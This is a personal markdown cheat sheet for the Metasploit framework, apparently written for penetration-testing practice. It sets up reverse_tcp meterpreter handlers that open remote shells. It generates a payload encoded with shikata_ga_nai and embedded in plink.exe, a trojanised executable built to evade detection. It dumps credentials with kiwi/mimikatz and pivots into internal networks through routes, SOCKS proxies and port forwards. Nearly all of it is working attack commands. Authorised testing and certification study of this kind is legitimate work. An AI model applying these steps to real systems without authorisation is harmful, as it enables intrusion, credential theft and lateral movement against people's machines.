---
title: Metasploit
author: i4
date: M11-12-2022
---

##  Database
```bash
systemctl start postgresql
sudo msfdb init
```

###  NMAP
```
db_nmap [ip] [options]
hosts
services -p [port]
```
## Meterpreter handler
```
msf> use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST <Listening_IP>
msf exploit(handler) > set LPORT <Listening_Port>
msf exploit(handler) > run -j # run in background
```


## Auto migrate
- spawns `notepad.exe` process (no GUI) and migrates to it.
```
msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
```

## Basic Information

### Staged / Non-Staged
```metasploit
windows/shell_reverse_tcp # Non-staged
windows/shell/reverse_tcp # staged
```
A non-staged payload is sent entirely along with the exploit. A staged on the other hand in two parts. 

The first part contains a small staged (primary payload) that causes the machine to connect back.


TLDR; if the buffer is too small for the whole payload, use a staged one.

### Payloads
Searching for different keywords
```metasploit
exploit(xx/xx/xx) > search meterpreter type:payload
```

#### Generating payloads from withing msfconsole
```meterpreter
> generate f exe -e x86/shikata_ga_nai -i 8 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```


### Advanced features
```metasploit
> show advanced
> set EnableStageEncoding true # Encodes the second staged payload
> set StageEncoder x86/shikata_ga_nai # Set encoder
> set AutoRunScript windows/gather/enum_logged_on_users # enum all logged on users after initial exploitation
```

##### Switching transports
It is possible to switch communication protocols using the `transport` command.
```
> transport list # lists the current possible transport protocols available
> transport add # Adds a new transport protocol '-t' sets the desired type 
```
Example
```meterpreter
> transport add -t reverse_tcp -l [ip] -p [port]
> background
> use multi/handler
...
> transport next
```

### Loading modules
#### Powershell
```meterpreter
> load powershell
> powershell_execute "$PSVersionTable.PSVersion"
```
#### Kiwi
```meterpreter
> load kiwi
> getsystem # mimikatz needs system to run
> creds_msv
```

## Pivoting 
- Added route will only work with established connections
```metasploit
# Add a route
> route add [ip]/[CIDR] [session ID]
```

``` metasploit
> use multi/manage/autoroute
```

Socks proxy can be configured like this:
```meterpreter
> use auxiliary/server/socks4a_proxy
```

#### Portforwarding
```meterpreter
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to conn
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
```

### Misc
- Commands can be saved in an `.rc` file
- Load them at startup with `msfconsole -r setup.rc` 
```metasploit
# Global variables
gset RHOSTS xxx.xxx.xxx.xxx
# Don't disabled listener if session dies
gset ExitOnSession false
# Enable automigration
set AutoRunScript post/windows/manage/migrate
```
## Development
- Recreate the folder structure 
copy skel from `/usr/share/metasploit-framework/modules`  to `/root/.msf4/modules/` 
